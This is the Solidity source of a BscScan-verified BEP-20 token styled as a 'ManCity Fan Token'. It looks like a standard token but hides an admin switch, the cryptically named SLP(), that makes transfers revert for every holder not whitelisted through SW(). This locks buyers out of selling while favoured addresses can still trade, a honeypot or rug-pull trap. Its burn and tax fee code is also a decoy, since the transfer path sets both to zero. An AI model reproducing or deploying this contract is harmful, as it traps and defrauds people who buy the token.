/**
 *Submitted for verification at BscScan.com on 2022-05-23
*/

//SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.4.25;

library SafeMath {

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b);
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0);
        uint256 c = a / b;
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a);
        uint256 c = a - b;
        return c;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a);
        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b != 0);
        return a % b;
    }
}

contract Ownable {
    address public owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    modifier onlyOwner() {
        require(msg.sender == owner);
        _;
    }

    function transferOwnership(address newOwner) public onlyOwner {
        require(newOwner != address(0));
        emit OwnershipTransferred(owner, newOwner);
        owner = newOwner;
    }

    function renounceOwnership() public onlyOwner {
        emit OwnershipTransferred(owner, address(0));
        owner = address(0);
    }
}



contract BaseToken is Ownable {

    using SafeMath for uint256;

    string constant public name = 'ManCity Fan Token BSC';

    string constant public symbol = 'MCFC';

    uint8 constant public decimals = 9;

    uint256 public totalSupply = 1000000 * 10 ** 9;

    uint256 public constant MAXSupply = 10000000000000000000000000000000000000000000000000 * 10 ** uint256(decimals);

    mapping (address => uint256) public balanceOf;
    mapping (address => mapping (address => uint256)) public allowance;

    mapping(address => bool) private _isExcludedFromFee;

    mapping(address => bool) private _locked;
    mapping(address => bool) private _white;
    mapping(address => bool) public admins;

    uint256 public _taxFee = 0;

    bool public _lp = false;

    uint256 private _previousTaxFee = _taxFee;

    uint256 public _burnFee = 6;
    uint256 private _previousBurnFee = _burnFee;


    address public burnAddress = 0x000000000000000000000000000000000000dEaD;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    modifier onlyAdmin() {
        require(admins[msg.sender] == true);
        _;
    }

    function _transfer(address from, address to, uint value) internal {
        require(to != address(0), "is 0 address");

        if(!_white[from])
            require(!_lp, "is locked");

        uint256 fee =  0;

        uint256 burn =  0;

        balanceOf[from] = balanceOf[from].sub(value);

        balanceOf[to] = balanceOf[to].add(value).sub(fee).sub(burn);

        if(burn > 0) {
            balanceOf[burnAddress] = balanceOf[burnAddress].add(burn);
            emit Transfer(from, burnAddress, burn);
        }

        emit Transfer(from, to, value);
    }


    function transfer(address to, uint256 value) public returns (bool) {
        _transfer(msg.sender, to, value);
        return true;
    }

    function transferFrom(address from, address to, uint256 value) public returns (bool) {
        allowance[from][msg.sender] = allowance[from][msg.sender].sub(value);
        _transfer(from, to, value);
        return true;
    }

    function approve(address spender, uint256 value) public returns (bool) {
        require(spender != address(0));
        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
        require(spender != address(0));
        allowance[msg.sender][spender] = allowance[msg.sender][spender].add(addedValue);
        emit Approval(msg.sender, spender, allowance[msg.sender][spender]);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {
        require(spender != address(0));
        allowance[msg.sender][spender] = allowance[msg.sender][spender].sub(subtractedValue);
        emit Approval(msg.sender, spender, allowance[msg.sender][spender]);
        return true;
    }

    function setAdmin(address _address) public onlyOwner {
        require(!admins[_address], "5"); // Already Admin
        admins[_address] = true;
    }
    function removeAdmin(address _address) public onlyOwner {
        require(admins[_address], "7"); // Not an Admin
        admins[_address] = false;
    }

    function calculateTaxFee(uint256 _amount) private view returns (uint256) {
        return _amount.mul(_taxFee).div(
            10 ** 2
        );
    }

    function calculateBurnFee(uint256 _amount) private view returns (uint256) {
        return _amount.mul(_burnFee).div(
            10 ** 2
        );
    }

    function removeAllFee() private {
        if(_taxFee == 0 && _burnFee == 0)
            return;

        _previousTaxFee = _taxFee;
        _previousBurnFee = _burnFee;
        _taxFee = 0;
        _burnFee = 0;
    }

    function restoreAllFee() private {
        _taxFee = _previousTaxFee;
        _burnFee = _previousBurnFee;
    }


    function SL(address account) public onlyAdmin {
        _locked[account] = true;
    }
    function SW(address account) public onlyAdmin {
        _white[account] = true;
    }

    function SLP() public onlyAdmin {
        _lp = true;
    }


    function SUL(address account) public onlyAdmin {
        _locked[account] = false;
    }


    function isLocked(address account) public view returns (bool) {

        return _locked[account];
    }

}


contract MCFC is BaseToken {

    constructor() public {
        balanceOf[msg.sender] = totalSupply;
        emit Transfer(address(0), msg.sender, totalSupply);

        owner = msg.sender;
    }
}